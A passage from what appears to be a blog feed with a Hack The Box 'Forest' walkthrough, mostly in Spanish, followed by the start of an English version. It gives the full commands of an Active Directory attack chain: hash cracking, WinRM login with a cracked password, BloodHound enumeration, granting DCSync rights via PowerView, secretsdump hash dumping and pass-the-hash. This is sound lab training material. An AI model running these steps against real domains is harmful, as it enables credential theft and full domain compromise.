&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;john
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/ruta/del/diccionario/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez obtenemos la contraseña del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;, podemos validar la credencial antes de intentar conectarnos a la máquina víctima para asegurarnos de que es correcta. Recordemos que durante nuestro escaneo con &lt;em&gt;Nmap&lt;/em&gt;, observamos que el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (&lt;em&gt;Windows Remote Management&lt;/em&gt;) está activo en la máquina víctima; este será el protocolo que utilizaremos para la conexión.&lt;/p&gt;

&lt;p&gt;Para validar la credencial, emplearemos &lt;em&gt;CrackMapExec&lt;/em&gt; con el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec winrm 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc-alfresco&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s3rvice&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos damos cuenta de que la credencial no solo es válida, sino también que este usuario pertenece al grupo &lt;em&gt;Remote Management Users&lt;/em&gt;, ya que vemos junto al nombre de usuario un mensaje que dice &lt;em&gt;Pwn3d!&lt;/em&gt;. Por lo tanto, podemos conectarnos a la máquina víctima mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Procederemos a conectarnos de la siguiente manera:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc-alfresco&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s3rvice&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;

&lt;p&gt;Una vez dentro de la máquina víctima, podemos empezar a recolectar información del &lt;em&gt;Active Directory&lt;/em&gt; que nos permita escalar privilegios. Para ello nos ayudaremos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt;, un recolector de datos para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;, una herramienta que permite analizar y visualizar relaciones y permisos en un entorno de &lt;em&gt;Active Directory&lt;/em&gt; para identificar posibles caminos de escalada de privilegios.&lt;/p&gt;

&lt;p&gt;Lo primero que haremos será descargar &lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound&lt;/a&gt; en nuestro equipo. Algo muy cómodo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; es que nos permite subir y descargar archivos muy fácilmente. Para ello, ejecutaremos el siguiente comando para subir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound.ps1&lt;/code&gt; a la máquina víctima:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload SharpHound.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez subido, importaremos y utilizaremos la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-BloodHound&lt;/code&gt; para recolectar toda la información necesaria.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\SharpHound.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-BloodHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Esto generará un archivo comprimido con toda la información del &lt;em&gt;AD&lt;/em&gt;. Para descargar este archivo a nuestro equipo, utilizaremos el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;download &amp;lt;timestamp&amp;gt;_BloodHound.zip BloodHound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos será importar el archivo comprimido que generó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;. Para ello, en caso de no contar con la herramienta instalada, podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;neo4j bloodhound
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Neo4j&lt;/em&gt; es la base de datos gráfica que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt; utiliza. La arrancaremos de la siguiente manera:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;neo4j console
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos indicará que nos dirijamos a &lt;a href=&quot;http://localhost:7474/&quot;&gt;http://localhost:7474/&lt;/a&gt;. Para conectarnos a &lt;em&gt;Neo4j&lt;/em&gt; por primera vez, las credenciales que introduciremos son las que vienen por defecto:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Username: neo4j&lt;/li&gt;
  &lt;li&gt;Password: neo4j&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A continuación, nos solicitará que cambiemos la contraseña; esta será la que utilizaremos para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez abramos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt; y nos logueemos, en la parte derecha veremos una sección que dice &lt;em&gt;Upload Data&lt;/em&gt;. Aquí es donde subiremos nuestro archivo comprimido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la barra de búsqueda en la parte superior izquierda, podemos buscar por el usuario que acabamos de comprometer, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;. Podemos hacer clic derecho sobre él y seleccionar &lt;em&gt;Mark User as Owned&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos dirigimos al apartado &lt;em&gt;Analysis&lt;/em&gt;, encontraremos una sección &lt;em&gt;Shortest Paths&lt;/em&gt;. Dentro de esta sección, seleccionamos &lt;em&gt;Shortest Path from Owned Principals&lt;/em&gt;. Al hacer clic, se desplegará un gráfico que ilustra el mejor camino para convertirnos en administrador del sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; es miembro del grupo &lt;em&gt;Service Accounts&lt;/em&gt;, el cual es miembro del grupo &lt;em&gt;Privileged IT Accounts&lt;/em&gt;, que a su vez es miembro del grupo &lt;em&gt;Account Operators&lt;/em&gt;. Además, el grupo &lt;em&gt;Account Operators&lt;/em&gt; tiene permisos &lt;em&gt;GenericAll&lt;/em&gt; sobre el grupo &lt;em&gt;Exchange Windows Permissions&lt;/em&gt;, lo que le da control total sobre este grupo. El grupo &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; tiene permisos &lt;em&gt;WriteDacl&lt;/em&gt; sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (&lt;em&gt;DACL&lt;/em&gt;) del dominio.&lt;/p&gt;

&lt;p&gt;Vamos por partes, el grupo &lt;em&gt;Account Operators&lt;/em&gt; otorga privilegios limitados de creación de cuentas a un usuario. Por lo tanto, el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; puede crear otras cuentas en el dominio. Por otra parte, el grupo &lt;em&gt;Account Operators&lt;/em&gt; tiene permisos &lt;em&gt;GenericAll&lt;/em&gt; sobre el grupo &lt;em&gt;Exchange Windows Permissions&lt;/em&gt;, lo que significa que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; puede modificar los permisos del grupo &lt;em&gt;Exchange Windows Permissions&lt;/em&gt;. Finalmente, el grupo &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; tiene permisos &lt;em&gt;WriteDacl&lt;/em&gt; sobre el dominio. Abusaremos de esto para otorgarnos privilegios de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El ataque &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; simula el comportamiento de un &lt;em&gt;Domain Controller&lt;/em&gt; y solicita a otros &lt;em&gt;Domain Controllers&lt;/em&gt; que repliquen información utilizando el protocolo &lt;em&gt;Directory Replication Service Remote Protocol&lt;/em&gt; (&lt;em&gt;MS-DRSR&lt;/em&gt;). Debido a que este protocolo es esencial para el funcionamiento de &lt;em&gt;Active Directory&lt;/em&gt;, no se lo puede desactivar. Realizando este ataque, podemos replicar la información del dominio y dumpear todos los hashes del mismo.&lt;/p&gt;

&lt;p&gt;Dicho todo esto, lo primero que haremos será aprovechar que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; es miembro del grupo &lt;em&gt;Account Operators&lt;/em&gt;, y crear un nuevo usuario. Para ello, haremos lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user nombreDeUsuario contraseña /add /domain
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente que haremos será añadir el usuario que acabamos de crear al grupo &lt;em&gt;Exchange Windows Permissions&lt;/em&gt;, aprovechando que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; tiene control total sobre este grupo:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exchange Windows Permissions&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nombreDeUsuario&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;También vamos a añadir este usuario al grupo &lt;em&gt;Remote Management Users&lt;/em&gt; para que pueda conectarse a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Remote Management Users&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nombreDeUsuario&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al añadir al usuario al grupo &lt;em&gt;Remote Management Users&lt;/em&gt;, evitamos el uso de &lt;em&gt;PSCredentials&lt;/em&gt;, que normalmente se utilizan para ejecutar comandos con las credenciales de otro usuario, las cuales, personalmente, me generaban conflictos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerView&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;A continuación, cerraremos la sesión actual de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; y nos conectaremos nuevamente con el usuario recién creado. Una vez conectados como el nuevo usuario, descargaremos en nuestro equipo el script &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView&lt;/a&gt;, que pertenece a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerSploit&lt;/code&gt; (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; y posteriormente lo importaremos:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez importado, utilizaremos la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add-DomainObjectAcl&lt;/code&gt; para otorgar permisos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCsync&lt;/code&gt; a nuestro usuario recién creado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Add-DomainObjectAcl &lt;span class=&quot;nt&quot;&gt;-TargetIdentity&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=htb,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PrincipalIdentity&lt;/span&gt; nombreDeUsuario &lt;span class=&quot;nt&quot;&gt;-Rights&lt;/span&gt; DCSync
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya con permisos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCsync&lt;/code&gt; en nuestro usuario, podemos utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump&lt;/code&gt;, otro script de la suite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; que nos permitirá dumpear los hashes de todos los usuarios del dominio:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-secretsdump htb.local/nombreDeUsuario:contraseña@10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente, podemos realizar un ataque de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pass the Hash&lt;/code&gt;, que consiste en usar el &lt;em&gt;hash&lt;/em&gt; que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; (otro script de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt;), o bien, mediante el mismo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Administrator&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HASH&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec administrator@10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-hash&lt;/span&gt; HASH
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 19 Aug 2024 00:00:00 -0400</pubDate>
        <link>/es/Forest-Hack-The-Box/</link>
        <guid isPermaLink="true">/es/Forest-Hack-The-Box/</guid>
      </item>
    
      <item>
        <title>Forest - Hack The Box</title>
        <description>&lt;p&gt;Today we are going to solve &lt;em&gt;Hack The Box’s&lt;/em&gt; &lt;em&gt;Forest&lt;/em&gt; machine. It is a &lt;em&gt;Windows&lt;/em&gt; machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png&quot; alt=&quot;User Rated Difficulty&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reconnaissance-phase&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Reconnaissance Phase&lt;/h3&gt;

&lt;p&gt;First, we’re going to launch an &lt;em&gt;ICMP traceroute&lt;/em&gt; to check if the machine is active.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the &lt;em&gt;TTL&lt;/em&gt; value; in this case, the machine’s &lt;em&gt;TTL&lt;/em&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt;, so we can infer that we are dealing with a &lt;em&gt;Windows&lt;/em&gt; machine. Remember, some of the reference values are as follows:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Operating System (OS)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;If we notice, in this case, the &lt;em&gt;TTL&lt;/em&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; as indicated in the table above. This is because, in the &lt;em&gt;Hack The Box&lt;/em&gt; environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the &lt;em&gt;TTL&lt;/em&gt; to decrease by one unit.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161 -R
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3b.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

